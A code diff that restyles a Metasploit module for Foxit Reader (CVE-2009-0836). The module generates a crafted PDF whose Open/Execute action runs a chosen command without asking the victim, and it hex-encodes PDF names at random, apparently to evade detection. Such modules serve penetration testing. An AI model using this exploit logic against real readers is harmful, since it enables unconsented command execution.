@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -7,36 +8,35 @@ require 'msf/core'
 require 'zlib'
 
 class MetasploitModule < Msf::Auxiliary
-
   include Msf::Exploit::FILEFORMAT
 
   def initialize(info = {})
     super(update_info(info,
-      'Name'           => 'Foxit Reader Authorization Bypass',
-      'Description'    => %q{
-          This module exploits a authorization bypass vulnerability in Foxit Reader
-        build 1120. When a attacker creates a specially crafted pdf file containing
-        a Open/Execute action, arbitrary commands can be executed without confirmation
-        from the victim.
-      },
-      'License'        => MSF_LICENSE,
-      'Author'         => [ 'MC', 'Didier Stevens <didier.stevens[at]gmail.com>', ],
-      'References'     =>
-        [
-          [ 'CVE', '2009-0836' ],
-          [ 'OSVDB', '55615'],
-          [ 'BID', '34035' ],
-        ],
-      'DisclosureDate' => 'Mar 9 2009',
-      'DefaultTarget'  => 0))
+                      'Name'           => 'Foxit Reader Authorization Bypass',
+                      'Description'    => %q(
+                          This module exploits a authorization bypass vulnerability in Foxit Reader
+                        build 1120. When a attacker creates a specially crafted pdf file containing
+                        a Open/Execute action, arbitrary commands can be executed without confirmation
+                        from the victim.
+                      ),
+                      'License'        => MSF_LICENSE,
+                      'Author'         => [ 'MC', 'Didier Stevens <didier.stevens[at]gmail.com>' ],
+                      'References'     =>
+                        [
+                          [ 'CVE', '2009-0836' ],
+                          [ 'OSVDB', '55615'],
+                          [ 'BID', '34035' ]
+                        ],
+                      'DisclosureDate' => 'Mar 9 2009',
+                      'DefaultTarget'  => 0))
 
     register_options(
       [
         OptString.new('CMD',        [ false, 'The command to execute.', '/C/Windows/System32/calc.exe']),
-        OptString.new('FILENAME',   [ false, 'The file name.',  'msf.pdf']),
-        OptString.new('OUTPUTPATH', [ false, 'The location of the file.',  './data/exploits/']),
-      ], self.class)
-
+        OptString.new('FILENAME',   [ false, 'The file name.', 'msf.pdf']),
+        OptString.new('OUTPUTPATH', [ false, 'The location of the file.', './data/exploits/'])
+      ], self.class
+    )
   end
 
   def run
@@ -50,15 +50,15 @@ class MetasploitModule < Msf::Auxiliary
     file_create(pdf)
   end
 
-  #http://blog.didierstevens.com/2008/04/29/pdf-let-me-count-the-ways/
+  # http://blog.didierstevens.com/2008/04/29/pdf-let-me-count-the-ways/
   def n_obfu(str)
     result = ""
     str.scan(/./u) do |c|
-      if rand(2) == 0 and c.upcase >= 'A' and c.upcase <= 'Z'
-        result << "#%x" % c.unpack('C*')[0]
-      else
-        result << c
-      end
+      result << if (rand(2) == 0) && (c.upcase >= 'A') && (c.upcase <= 'Z')
+                  "#%x" % c.unpack('C*')[0]
+                else
+                  c
+                end
     end
     result
   end
@@ -80,7 +80,6 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def make_pdf(exec)
-
     xref = []
     eol = "\x0d\x0a"
     endobj = "endobj" << eol
@@ -109,9 +108,7 @@ class MetasploitModule < Msf::Auxiliary
     end
     pdf << "trailer" << n_obfu("<</Size %d/Root " % (xref.length + 1)) << io_ref(1) << ">>" << eol
     pdf << "startxref" << eol
-    pdf << xrefPosition.to_s() << eol
+    pdf << xrefPosition.to_s << eol
     pdf << "%%EOF" << eol
-
   end
-
 end
